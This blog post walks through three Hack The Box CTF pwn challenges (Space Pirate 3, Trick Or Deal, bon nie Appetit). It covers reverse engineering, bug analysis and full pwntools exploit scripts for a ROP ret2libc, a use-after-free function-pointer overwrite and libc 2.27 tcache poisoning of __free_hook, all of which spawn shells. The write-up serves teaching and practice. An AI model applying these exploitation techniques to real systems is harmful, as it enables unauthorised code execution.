# Apocalypse CTF by HTB (pwn challenges)

Last week I had some time (not that much as I wish >( ) to solve some of the PWN challenges at the **Apocalypse CTF** by Hack The Box, I managed to solve all pwn challenges except for the last one, and I finished the "Sabotage" challenge after the CTF. I wanted to practice my writing and keep this blog alive, so I decided to create a few entries for some challenges that I found interesting, so I hope it is helpful to someone.

[Here's a link to the challenges explained in this post](https://github.com/dplastico/dplastico.github.io/tree/main/_posts/apoca_bins)

## Space Pirate 3: Retribution

This challenge was the 3rd and last from a series of introductory challenges (some simple and easy buffer overflows). I will not go into BOF's exploitation since I did that a lot in the past. You can read about BOFs and watch streams (in Spanish)

[Here](https://dplastico.github.io/sin%20categor%C3%ADa/2020/11/17/ropemporium-2020-soluciones.html)

I picked this challenge since it had more protections than the previous ones. To pwn it, you must bypass ASLR, PIE, NX, and FULL RELRO. We can verify the above by running **checksec** on the binary, as shown below.

![](https://raw.githubusercontent.com/dplastico/dplastico.github.io/main/_posts/img/2022-05-25-12-00-38.png)

We are provided with a custom Glibc for this binary under the folder **Glibc/libc.so.6**, If you want to know which Glibc version it is, you can use the **libc-database** https://github.com/niklasb/libc-database  to verify if the checksum of the Glibc corresponds to any known one. That way, we can learn about the restrictions on it. For that, we can use the "identify" utility in **libc-database** as shown below.

![](https://raw.githubusercontent.com/dplastico/dplastico.github.io/main/_posts/img/2022-05-25-12-04-19.png)

We are dealing with an old version **2.23**. With this information, let's dig deeper into the binary to find the vulnerability and exploit it.

![](https://raw.githubusercontent.com/dplastico/dplastico.github.io/main/_posts/img/2022-05-25-12-06-55.png)

Above, we can see that the program lets us choose 2 options: "Show missiles" that display some stats and then "Change Target's location", which allows us to enter some coordinates and then confirm with a y/n question.

**Analysis & Reverse Engineering** 

Looking at the disassembly code (I'm using IDA pro for this example, but you can achieve the same goal using Ghidra), we found the mentioned functions:

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char buf[3]; // [rsp+Dh] [rbp-3h] BYREF

  setup(argc, argv, envp);
  banner();
  while ( 1 )
  {
    while ( 1 )
    {
      printf(aS1ShowMissiles, "\x1B[1;34m");
      read(0, buf, 2uLL);
      if ( buf[0] != 49 )
        break;
      show_missiles();
    }
    if ( buf[0] != 50 )
    {
      printf("\n%s[-] Invalid option! Exiting..\n\n", "\x1B[1;31m");
      exit(1312);
    }
    missile_launcher();
  }
}
```

Setup and banner functions are just to prepare the binary for the challenge (buffering and printing the banner), so let's examine these functions. Lets focus on *missile_launcher()* sin the *show_missiles()* function seems to only print and no apparent format string vulnerability.

```c
int missile_launcher()
{
  __int64 v1[4]; // [rsp+0h] [rbp-50h] BYREF
  char buf[32]; // [rsp+20h] [rbp-30h] BYREF
  __int64 v3; // [rsp+40h] [rbp-10h]
  __int64 v4; // [rsp+48h] [rbp-8h]

  v4 = 0x53E5854620FB399FLL;
  v3 = 0x576B96B95DF201F9LL;
  printf(
    "\n[*] Current target's coordinates: x = [0x%lx], y = [0x%lx]\n\n[*] Insert new coordinates: x = [0x%lx], y = ",
    0x53E5854620FB399FLL,
    0x576B96B95DF201F9LL,
    0x53E5854620FB399FLL);
  memset(v1, 0, sizeof(v1));
  read(0, buf, 0x1FuLL);
  printf("\n[*] New coordinates: x = [0x53e5854620fb399f], y = %s\n[*] Verify new coordinates? (y/n): ", buf);
  read(0, v1, 0x84uLL);
  return printf(
           "\n%s[-] Permission Denied! You need flag.txt in order to proceed. Coordinates have been reset!%s\n",
           "\x1B[1;31m",
           "\x1B[1;34m");
}
```

We can spot a bug that allows us to leak an address from the binary code, but how? Above is the Pseudo Code from the disassembly of the *missile_launcher()* function. If you check these lines in detail, you will be able to understand.

```c
  read(0, buf, 0x1FuLL);
  printf("\n[*] New coordinates: x = [0x53e5854620fb399f], y = %s\n[*] Verify new coordinates? (y/n): ", buf);
```
As shown above, we will read input from the user and then print the buffer (buf) as a string. If we don't send any input, it will just print whatever the "buf" variable is pointing at, so basically, not providing input will lead us to a leak, as shown below:

![](https://raw.githubusercontent.com/dplastico/dplastico.github.io/main/_posts/img/2022-05-25-12-30-38.png)

Great, now let's move on to see how we can use this Leak to chain it against another vulnerability since by itself will not help us to exploit the binary. For that, we can follow the function mentioned, *missile_launcher()*. It is worth noticing that the *buf* variable in this representation is a *char* data type buffer of 32 bytes (char buf[32]), but it's used to read the confirmation y/n answer with a read function that allows writing 0x84 bytes, so we have a 0x64 BOF in this function, as shown below

```c
  printf("\n[*] New coordinates: x = [0x53e5854620fb399f], y = %s\n[*] Verify new coordinates? (y/n): ", buf);
  read(0, v1, 0x84uLL); // <-! overflow!
```
![](https://raw.githubusercontent.com/dplastico/dplastico.github.io/main/_posts/img/2022-05-25-12-37-13.png)

**Exploit plan**

With all this information, exploitation becomes trivial. As I mentioned at the beginning of the post, I already explained this in several posts, so I will briefly summarize how I will proceed to exploit it. This is just a regular ROP.

1. Stage 1

- Use the 1st vulnerability to leak a binary address.
- Calculate the base address.
- Identify necessary.
- Use the puts function to print a GOT Address and leak a Glibc address. (GOT address as argument of puts)
- Restart the function or go back to the main function.

2. Stage 2

- Generate a BOF once the function is restarted.
- Identify an address with the "/bin/sh" string in Glibc.
- call system with the "/bin/sh" string as argument (rdi).

The final code for this challenge is below:

```python
#!/usr/bin/python3
from pwn import *
gs = '''
continue
'''
elf = context.binary = ELF('./sp_retribution')
libc = elf.libc
#you can add this if you use tmux, if not, remove it or change it for you debugging choice
context.terminal = ['tmux', 'splitw', '-hp', '70']

def start():
    if args.GDB:
        return gdb.debug('./sp_retribution', gdbscript=gs)
    if args.REMOTE:
        return remote('139.59.184.63',30328)
    else:
        return process('./sp_retribution')
r = start()
#========= exploit here ===================

#Stage 1

r.sendlineafter(b">>", "2")
r.sendlineafter(b"99f], y =", "")
r.recvline()
r.recvline()
r.recvline()
r.recvline()

base = int(hex(u64(r.recvline().strip().ljust(8, b"\x00")))[:-1]+"000", 16)
log.info(f"leak = {(hex(base))}")
elf.address = base
poprdi = elf.address + 0x0d33

payload = b"A" * 0x58
payload += p64(poprdi)
payload += p64(elf.got.puts)
payload += p64(elf.sym.puts)
payload += p64(elf.sym.missile_launcher)

r.sendlineafter("Verify new coordinates? (y/n):", payload)
r.recvline()
r.recvline()
libc.address = u64(r.recvline().strip().ljust(8, b"\x00")) - 0x6f6a0
log.info(f"libc = {hex(libc.address)}")

#Stage 2

binsh = next(libc.search(b"/bin/sh"))
r.sendlineafter("b399f], y = ", "dpl")
payload = b"A"*0x58
payload += p64(poprdi)
payload += p64(binsh)
payload += p64(libc.sym.system)
r.sendlineafter("[*] Verify new coordinates? (y/n): ", payload)

#========= interactive ====================
r.interactive()
#HTB{d0_n0t_3v3R_pr355_th3_butt0n}
```
## Trick Or Deal

This was an enjoyable challenge to solve. It's an x64 program with enabled FULL RELRO, Canary, NX, and PIE. I used the "libc-database" discussed previously to find out this was a 2.31 Glibc version. This is worth noticing since you will see on the output below a custom Glibc. I use [patchelf](https://github.com/NixOS/patchelf) to patch the binary with a Glibc version of my own compiled with symbols. This way, I can use commands like "vis" in pwndbg and better visualize the heap layout.


![](https://raw.githubusercontent.com/dplastico/dplastico.github.io/main/_posts/img/2022-05-25-13-20-41.png)

**Walkthrough & Reverse Engineering** 

The program functionality is on a menu with different options that point to functions.

![](https://raw.githubusercontent.com/dplastico/dplastico.github.io/main/_posts/img/2022-05-25-13-25-55.png)

From Reverse Engineering, you can see a "win" function called unlock_storage(). If you managed to redirect code execution to it, it would execute a shell, as shown below.

```c
int unlock_storage()
{
  fprintf(stdout, "\n%s[*] Bruteforcing Storage Access Code . . .%s\n", "\x1B[5;32m", "\x1B[25;0m");
  sleep(2u);
  fprintf(stdout, "\n%s* Storage Door Opened *%s\n", "\x1B[1;32m", "\x1B[1;0m");
  return system("sh");
}
```

This will immediately provide us a clue on how to exploit the binary. Let's examine option "2", "Buy Weapons''.

```c
size_t buy()
{
  char buf[72]; // [rsp+0h] [rbp-50h] BYREF
  unsigned __int64 v2; // [rsp+48h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  fwrite("\n[*] What do you want!!? ", 1uLL, 0x19uLL, stdout);
  read(0, buf, 0x47uLL); 
  fprintf(stdout, "\n[!] No!, I can't give you %s\n", buf);
  fflush(stdout);
  return fwrite("[!] Get out of here!\n", 12uLL, 0x15uLL, stdout);
}
```

If you noticed, we have a 72 bytes buffer size that will be printed to stdout as a string, so if we provided a short name, it could print the rest of the data on the stack until it finds a NULL byte. After some trial and error, I manage to leak a stack address sending 64 bytes, as shown in the following function, where data will be 64-byte length.

```python
def leak_1(data):
    leak = ""
    r.sendline(b"2")
    r.sendafter(b"What do you want!!?",data)
    r.recvuntil(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
    leak = u64(r.recvline().strip().ljust(8, b"\x00"))
    return leak
```
I didn't end up using this stack leak, but I keep it just in case there's another way to exploit it.

Using the same idea and debugging, I noticed that after 7 bytes (8 if you count out the "0xA"), you can leak a binary address. It's fun to mention that I didn't discover this through Reverse Engineering. Sometimes playing with the binary functionality can be helpful. In this case, I was reading the output from the "1" option that printed out some names, and "Phasers" Was one of them. So I noticed some strange data after using this and then looked on IDA to confirm the Leak.

![](https://raw.githubusercontent.com/dplastico/dplastico.github.io/main/_posts/img/2022-05-25-13-47-12.png)

You can leak the address using a function similar to the one below.

```python

def leak_2():
    leak = ""
    r.sendline(b"2")
    r.sendlineafter(b"What do you want!!?",b"Phasers")
    r.recvline()
    r.recvline()
    leak = u64(r.recvline().strip().ljust(8, b"\x00"))
    r.recvuntil(b"[*] What do you want to do?")
    return leak
```

Now, this is where things get interesting. I will explain what my thought process was. Maybe there's a more efficient way to discover this bug, but in my case, it starts with this: I first noticed that when you call option "1" from the menu, the "storage" variable is passed to the RAX register and then moves the value at RAX + 0x48 to RDX to then CALL RDX as shown below:

![](https://raw.githubusercontent.com/dplastico/dplastico.github.io/main/_posts/img/2022-05-25-13-58-48.png)

Also, using GDB, I could confirm that "storage" is an address pointing to a 0x60 size chunk on the heap and that at 0x48 from it, you can find the function that prints the storage. 

![](https://raw.githubusercontent.com/dplastico/dplastico.github.io/main/_posts/img/2022-05-25-14-01-55.png)

So if we somehow manage to control RAX at 0x48 or the storage address, we would be able to redirect the code execution. 

Option "3" lets us create a chunk on the heap, but this will allocate a new chunk, and storage will continue to point to the same chunk. Option "4" it's interesting because it will allow us to free the storage.

```c
int steal()
{
  fwrite("\n[*] Sneaks into the storage room wearing a face mask . . . \n", 1uLL, 0x3DuLL, stdout);
  sleep(2u);
  fprintf(stdout, "%s[*] Guard: *Spots you*, Thief! Lockout the storage!\n", "\x1B[1;31m");
  free(storage);
  sleep(2u);
  return fprintf(stdout, "%s[*] You, who didn't skip leg-day, escape!%s\n", "\x1B[1;32m", "\x1B[1;35m");
}
```
And since we are on Glibc version **2.31**, this will allow us to get the same chunk if we ask for a 0x60 size chunk, and if we add data up to 0x48 and then the win function "unlock_storage()" we will pwn this binary and get a shell.

**Exploit plan:**

- leak the address of the binary
- Calculate unlock_storage address
- Free the "storage".
- Allocate a 0x60 size chunk
- Write 0x48 JJunk data and then write the unlock_storage() address
- Use option 1 to get a shell

The following Exploit accomplishes this:.

```python
#!/usr/bin/python3
from pwn import *
gs = '''
continue
'''
#you can add this if you use tmux. If not, remove or change it for your debugging choice.

elf = context.binary = ELF('./trick_or_deal')
context.terminal = ['tmux', 'splitw', '-hp', '70']

def start():
    if args.GDB:
        return gdb.debug('./trick_or_deal', gdbscript=gs)
    if args.REMOTE:
        return remote('138.68.150.120',30119)
    else:
        return process('./trick_or_deal')
r = start()


def see():
    r.sendline(b"1")

def leak_1(data):
    leak = ""
    r.sendline(b"2")
    r.sendafter(b"What do you want!!?",data)
    r.recvuntil(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
    leak = u64(r.recvline().strip().ljust(8, b"\x00"))
    return leak

def leak_2():
    leak = ""
    r.sendline(b"2")
    r.sendlineafter(b"What do you want!!?",b"Phasers")
    r.recvline()
    r.recvline()
    leak = u64(r.recvline().strip().ljust(8, b"\x00"))
    r.recvuntil(b"[*] What do you want to do?")
    return leak

#========= exploit here ===================

leak1 = leak_1(b"A"*64)
log.info(f"stack leak = {hex(leak1)}")
leak2 = leak_2()
log.info(f"leak 2 = {hex(leak2)}")
elf.address = leak2-0x15e2
log.info(f"base = {hex(elf.address)}")

#free 0x60 chunk with the "call to RDX on 0x48"
r.sendline(b"4")
r.recvuntil(b" do you want to do?")

payload = b"A"*0x48
payload += p64(elf.sym.unlock_storage) # win function 

r.sendline(b"3")
r.recvuntil(b"Are you sure that you want to make an offer(y/n)")
r.sendline(b"y")
r.sendlineafter(b"your offer to be?", str(0x58))
r.sendafter(b"What can you offer me?", payload) #call RDX at buf + 0x48

#execute, calling 1 
r.recvuntil(b"What do you want to do?")
#shell
r.sendline(b"1")

#HTB{tr1ck1ng_d3al3rz_f0r_fUn_4nd_pr0f1t}
#========= interactive ====================
r.interactive()
```
## bon nie Appetit

I love heap challenges, so I really enjoy this one. I did similar challenges on some CTFs before, but still, this was an excellent opportunity to write about it. The binary has full protections.

![](https://raw.githubusercontent.com/dplastico/dplastico.github.io/main/_posts/img/2022-05-25-14-21-08.png)

And it's running libc 2.27

![](https://raw.githubusercontent.com/dplastico/dplastico.github.io/main/_posts/img/2022-05-25-14-21-45.png)


I immediately noticed that this looked like a *"note"* challenge, so as usual, before anything and to speed up debugging, I created a skeleton with the functions so I could easily use python with GDB to debug. This is something that I recommend doing on this kind of challenge. You can find the skeleton below:

```python
#!/usr/bin/python3
from pwn import *
gs = '''
continue
'''
elf = context.binary = ELF('./bon-nie-appetit')
libc = elf.libc
context.terminal = ['tmux', 'splitw', '-hp', '70']
index = 0

def start():
    if args.GDB:
        return gdb.debug('./bon-nie-appetite, gdbscript=gs)
    if args.REMOTE:
        return remote('178.62.43.214',31141)
    else:
        return process('./bon-nie-appetite)

def make(size, data):
    global index
    r.sendline(b"1")
    r.sendlineafter(b"[*] For how many:", f"{size}")
    r.sendafter(b"What would you like to order:", data)
    r.recvuntil(b">")
    index += 1
    return index-1

def show(index):
    r.sendline(b"2")
    r.sendlineafter(b" Number of order:", str(index))
    r.recvuntil(b"=> ")
    d = u64(r.recvline().strip().ljust(8,b"\x00"))
    r.recvuntil(b">")
    return d

def edit(index,data):
    r.sendline(b"3")
    r.sendlineafter(b" Number of order:", str(index))
    r.sendafter(b"New order:", data)
    r.recvuntil(b">")

def delete(index):
    r.sendline(b"4")
    r.sendlineafter(b" Number of order:", str(index))
    r.recvuntil(b">")

r = start()
r.timeout = 3
#========= exploit here ===================

#========= interactive ====================
r.interactive()
```
With this, it's easy to follow this post if you want to try to solve it that way or analyze the reading.

Also, since I did some write-ups of heap challenges before, I will skip some basic details of the techniques that will be used, but if you are not familiar with heap exploitation, you can read the following articles before if you like:

[https://heap-exploitation.dhavalkapil.com/](https://heap-exploitation.dhavalkapil.com/)
[https://github.com/shellphish/how2heap](https://github.com/shellphish/how2heap)
[https://github.com/dplastico/lockdown-tcache-poison](https://github.com/dplastico/lockdown-tcache-poison)

**Walkthrough & Reverse Engineering**

You can reverse engineer the whole binary (it's not a bug), but I will focus on the functions and sections that will lead us to exploitation. Below you can see the pseudo-code from the main function.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[168]; // [rsp+0h] [rbp-B0h] BYREF
  unsigned __int64 v5; // [rsp+A8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  memset(s, 0, 0xA0uLL);
  setup();
  banner();
  while ( 1 )
  {
    menu();
    switch ( read_num() )
    {
      case 1:
        new_order((__int64)s);
        break;
      case 2:
        show_order(s);
        break;
      case 3:
        edit_order((__int64)s);
        break;
      case 4:
        delete_order((__int64)s);
        break;
      case 5:
        printf("%s\n[+] Your order will be ready soon!\n", "\x1B[1;32m");
        exit(69);
      default:
        printf("\n%s[-] Invalid option!%s\n", "\x1B[1;31m", "\x1B[1;34m");
        break;
    }
  }
}
```

As you can see, it looks like a typical Heap challenge. Option "1"  will allow us to allocate a chunk on the heap ad fill it with data.
Option "2" to read from a chunk allocated, option "3" to edit a chunk on the heap, and option "4" will free a chunk on the heap that we indicate through the index number, and option "5" will exit the program.

Now let's examine the edit_order function in detail:

```c
unsigned __int64 __fastcall edit_order(__int64 a1)
{
  size_t v1; // rax
  int num; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("\n[*] Number of order: ");
  num = read_num();
  if ( num >= 0 && num <= 19 && *(_QWORD *)(8LL * num + a1) )
  {
    printf("\n[*] New order: ");
    v1 = strlen(*(const char **)(8LL * num + a1));
    read(0, *(void **)(8LL * num + a1), v1);
  }
  else
  {
    printf("\n%s[-] There is no such order!%s\n", "\x1B[1;31m", "\x1B[1;34m");
  }
  return __readfsqword(0x28u) ^ v4;
}
```
As shown above, the "if '' statement that checks if the index is no less than zero, and more than 20, 
It also checks whether the pointer on the heap is represented by *"(_QWORD *)(8LL * num + a1)"*.

Considering this, we can spot the bug on these 2 lines:

```c
    v1 = strlen(*(const char **)(8LL * num + a1));
    read(0, *(void **)(8LL * num + a1), v1);
```
The pseudo-code representation shows that *v1* will hold the value returned by the length of the string on the heap. And then, that value is used by reading the data size to write on the same heap chunk.

Let's check **strlen** documentation before continuing.

![](https://raw.githubusercontent.com/dplastico/dplastico.github.io/main/_posts/img/2022-05-25-14-48-13.png)

The *strlen* function counts each char on a string until it finds a NULL byte. We can combine this information with the fact that the allocated chunks will have the size field of itself right after the data of the previous one. So this will generate a *1-byte overflow.*

As an example, if we allocate 2 chunks with the following code:

```python
a = make(0x18, "A"*0x18)
b = make(0x18, b"B"*0x18)
```
Now, if we examine this in GDB with the vis command, you will see the chunks allocated:

![](https://raw.githubusercontent.com/dplastico/dplastico.github.io/main/_posts/img/2022-05-25-14-56-39.png)

As it's highlighted, **strlen** will count the size of the next chunk as part of the string generating a 1-byte overflow if we edit a "filled" chunk.

Considering this, we need to leverage an exploit that will abuse this 1-byte overflow bug to first Leak a Glibc address and then gain arbitrary write to write to get code execution.

**Leak** 

To generate a leak and basically to exploit the binary, we will create a "fake" chunk that will overlap allocated chunks. This is known as [Overlkaping chunks](https://heap-exploitation.dhavalkapil.com/attacks/shrinking_free_chunks). This can be triggered by a situation where [backwards concolidation](https://sourceware.org/git/?p=glibc.git;a=commit;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30) will be executed generating this chunk. An excellent example of how to exploit this in a very similar way can be found in this excellent post by great pwner [f4d3 here](https://f4d3.io/hacktivitycon-pwn/)

Let's first create a heap layout that helps us to achieve our goal.

```python
a = make(0x18, "A"*0x18)
b = make(0x428, b"B"*0x18)
c = make(0x18, b"C"*0x18)
y = make(0x18, b"Y"*0x18)
d = make(0x18, b"D"*0x18)
e = make(0x428, b"E"*8)
guard = make(0x18, b"/bin/sh\x00") #this string /bin/sh is used later on 
```

As shown above, first, we generated a 0x20 size chunk (0x18, will give you a 0x20 chunk, a 0x28, a 0x30 one, and so on...) followed by a 0x430 size chunk that, once freed, will not be direct to the tcache. Then we allocate three more  0x20 chunks, another 0x430, and a guard chunk to avoid consolidation with the top chunk.

So now we can free the large chunk, which will generate a chunk in the unsorted bin, leaving 2 Glibc addresses as FD and BK in the freed chunk in our case, *chunk b*.

![](https://raw.githubusercontent.com/dplastico/dplastico.github.io/main/_posts/img/2022-05-25-15-14-47.png)

Now we can generate an overflow editing *chunk d* if we calculate the size of our previous freed chunk will be 0x490; we need to add that as a fake "prev_size" because we want to cause backward consolidation, and this field will be checked to match the size of the chunk. So we edit *chunk d* as follows.

```python
edit(d, p64(0)*2+p64(0x490)+p8(0x30))
edit(a, p64(0)*3+p8(0x90)) # calculated 0x490 size to accommodate for the fake large chunk
delete(e)
```
This way, we clear the flag on the 0x30 size, indicating that the previous chunk is free. Soon when this chunk is free, it will trigger backward consolidation. But not before editing with the same overflow, the *chunk a* that can modify our initial 0x430 chunk to the calculated 0x490 size

![](https://raw.githubusercontent.com/dplastico/dplastico.github.io/main/_posts/img/2022-05-25-15-20-34.png)

Now we have this big free chunk in the unsorted bin overlapping our 0x20 chunks in the "middle".
We can now allocate a chunk of a size that will just overlap a created chunk writing the FD and BK of the unsorted bin on an allocated chunk, so ten using the read functions, we can have a leak and then calculate the Glibc base address as display below.

![](https://raw.githubusercontent.com/dplastico/dplastico.github.io/main/_posts/img/2022-05-25-15-24-17.png)

**Exploit**

Now with a leak and since we still have a chunk in the unsorted bin, we can easily trigger a tcache poison situation. Freeing the *chunk d* and then requesting a chunk that will overlap *chunk d* so we can fill the tcache pointer to the next tcache bin, in this case, an address of our choice. And Since we are in Glibc version 2.27 we don't need to care about the key field or the count on the tcache. We can accomplish this with the following code

```python
#tcache poison
delete(a)
delete(d)

overlap = make(0x68, b"X"*0x40 +p64(libc.sym.__free_hook))
make(0x18, "dpla")
make(0x18, p64(0xdeadbeef))
delete(guard)
```
As you noticed we overwrite the tcache entry with the free_hook, this is because any address written to this hook will be executed once free is triggered. 


![](https://raw.githubusercontent.com/dplastico/dplastico.github.io/main/_posts/img/2022-05-25-15-35-25.png)

Now the only thing that's left is to replace the 0xdeadbeef value with the system address and then, as we prepared before, free the *guard chunk* that holds the "/bin/sh\0" value that will be used as an argument to the hooked function, in this case, system.

Below is the final exploit code
```python
#!/usr/bin/python3
from pwn import *
gs = '''
continue
'''
elf = context.binary = ELF('./bon-nie-appetit')
libc = elf.libc
context.terminal = ['tmux', 'splitw', '-hp', '70']

index = 0


def start():
    if args.GDB:
        return gdb.debug('./bon-nie-appetite, gdbscript=gs)
    if args.REMOTE:
        return remote('178.62.43.214',31141)
    else:
        return process('./bon-nie-appetite)


def make(size, data):
    global index
    r.sendline(b"1")
    r.sendlineafter(b"[*] For how many:", f"{size}")
    r.sendafter(b"What would you like to order:", data)
    r.recvuntil(b">")
    index += 1
    return index-1

def show(index):
    r.sendline(b"2")
    r.sendlineafter(b" Number of order:", str(index))
    r.recvuntil(b"=> ")
    d = u64(r.recvline().strip().ljust(8,b"\x00"))
    r.recvuntil(b">")
    return d

def edit(index,data):
    r.sendline(b"3")
    r.sendlineafter(b" Number of order:", str(index))
    r.sendafter(b"New order:", data)
    r.recvuntil(b">")

def delete(index):
    r.sendline(b"4")
    r.sendlineafter(b" Number of order:", str(index))
    r.recvuntil(b">")

r = start()
r.timeout = 3
#========= exploit here ===================
a = make(0x18, "A"*0x18)
b = make(0x428, b"B"*0x18)
c = make(0x18, b"C"*0x18)
y = make(0x18, b"Y"*0x18)
d = make(0x18, b"D"*0x18)
e = make(0x428, b"E"*8)
guard = make(0x18, b"/bin/sh\x00") #this string /bin/sh is used later on 

delete(b)
edit(d, p64(0)*2+p64(0x490)+p8(0x30))
edit(a, p64(0)*3+p8(0x90)) # calculated 0x490 size to accommodate for the fake large chunk
delete(e)
#
#this generate a large 0x8a0 chunk in the unsorted bin
f = make(0x428, "F")
#libc leak
leak = show(c)
log.info(f"leak = {hex(leak)}")
libc.address = leak - 0x3ebca0
log.info(f"libc = {hex(libc.address)}")

#tcache poison
delete(a)
delete(d)

overlap = make(0x68, b"X"*0x40 +p64(libc.sym.__free_hook))
make(0x18, "dpla")
make(0x18, p64(0xdeadbeef))
delete(guard)

#========= interactive ====================
r.interactive()

#HTB{0n3_l1bc_2.27_w1th_3xtr4_tc4ch3_pl3453}
```
## Conclusion

I really enjoyed the pwn challenges on this CTF. I would love more time to finish all of them and maybe do some RE challs. But maybe next time, you can contact me at @dplastico for any feedback.


